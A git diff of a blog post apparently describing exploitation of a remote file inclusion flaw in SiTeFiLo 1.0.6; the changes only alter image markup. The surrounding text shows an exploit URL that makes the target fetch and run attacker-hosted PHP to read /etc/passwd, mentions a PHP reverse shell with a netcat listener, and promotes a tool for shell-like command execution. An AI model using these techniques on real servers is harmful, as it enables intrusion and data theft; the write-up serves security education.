@@ -15,7 +15,7 @@ Typically if you can find an RFI vulnerability, then you can get it to execute a
 
 Let's have a look at a basic RFI example. We've discovered a target running the Simple Text-File Login script (SiTeFiLo). Version 1.0.6 is vulnerable to RFI attacks, as detailed in this advisory: [http://www.securityfocus.com/bid/32811/](http://www.securityfocus.com/bid/32811/)
 
-->![](/images/2012-06-26/01.png)<-
+![](/images/2012-06-26/01.png)
 
 According to the advisory, we can specify the location of our own header.inc.php and have the target execute our PHP code. Let's test this. We create a /var/www/header.inc.php.txt file with the following contents:
 
@@ -33,11 +33,11 @@ http://taint.techorganic.com/slogin/slogin_lib.inc.php?slogin_path=http://cactua
 
 When we load up that URL on the browser, we see our command get executed, and the contents of /etc/passwd displayed on the screen:
 
-->![](/images/2012-06-26/02.png)<-
+![](/images/2012-06-26/02.png)
 
 Now that we've verified that we can run commands on the server, we grab our PHP reverse shell, rename it to header.inc.php.txt, fire up netcat to listen for connections, refresh the browser, and... nothing.
 
-->![](/images/2012-06-26/03.png)<-
+![](/images/2012-06-26/03.png)
 
 Well as it turns out, this particular target we're attacking only allows inbound and outbound connections on port 80, and blocks everything else. One alternative around this is to host the PHP reverse shell elsewhere, and have netcat listen on port 80 for connections. If this isn't possible, or you don't want to have a reverse shell, here's one possible solution to simplify command execution on the target, without having to modify the PHP file manually.
 
@@ -55,11 +55,11 @@ cat /etc/passwd
 
 and see the results displayed to us:
 
-->![](/images/2012-06-26/04.png)<-
+![](/images/2012-06-26/04.png)
 
 We can enter commands one after another, as if we were logged into the server with a shell:
 
-->![](/images/2012-06-26/05.png)<-
+![](/images/2012-06-26/05.png)
 
 The script itself is very minimal, but definitely expandable. By default, it uses PHP, but you can modify the rfi_template function to tailor it for ASP, JSP, or whatever else. The script requires curl, so make sure you have that installed. You can get the latest version of rfishell from [GitHub](https://github.com/superkojiman/rfishell). 
 
